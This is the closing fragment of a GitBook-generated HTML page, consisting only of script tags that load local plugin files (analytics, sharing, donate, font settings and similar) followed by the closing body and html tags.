        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-code/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
        
    

    </body>
</html>

